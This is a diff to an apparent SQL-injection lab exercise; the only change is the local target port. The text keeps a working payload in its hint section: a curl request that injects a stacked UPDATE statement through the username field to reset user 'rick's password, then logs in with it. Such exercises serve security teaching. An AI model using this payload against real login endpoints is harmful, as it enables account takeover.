@@ -41,7 +41,7 @@ Let's say we are an attacker and want to execute some arbitrary SQL into this.
 Try to exploit the endpoint `/login` using a SQL injection. A valid, but unauthorized request looks like this:
 
 ```
-curl -XPOST -H 'Content-Type: application/json' -d '{"username":"rick", "password":"password"}' 'http://localhost:8080/login'
+curl -XPOST -H 'Content-Type: application/json' -d '{"username":"rick", "password":"password"}' 'http://localhost:8081/login'
 ```
 
 Try to gain access as the user `rick`.
@@ -52,13 +52,13 @@ Try to gain access as the user `rick`.
   Though you may not be able to execute a 1=1 type login, you can still update the password and re-login a separate time
 
   ```
-  $ curl -XPOST -H 'Content-Type: application/json' -d "{\"username\":\"rick'; update users set password=md5('password') where username = 'rick' --\", \"password\":\"foo\"}" 'http://localhost:8080/login'
+  $ curl -XPOST -H 'Content-Type: application/json' -d "{\"username\":\"rick'; update users set password=md5('password') where username = 'rick' --\", \"password\":\"foo\"}" 'http://localhost:8081/login'
   ```
 
   We should get an error and that's fine, we've broken the JDBC parser and successfully changed `rick`s password to something we know: `password`. Now try logging in with that password:
 
   ```
-  $ curl -XPOST -H 'Content-Type: application/json' -d '{"username":"rick", "password":"password"}' 'http://localhost:8080/login' | jq .
+  $ curl -XPOST -H 'Content-Type: application/json' -d '{"username":"rick", "password":"password"}' 'http://localhost:8081/login' | jq .
   ```
 
 </details>
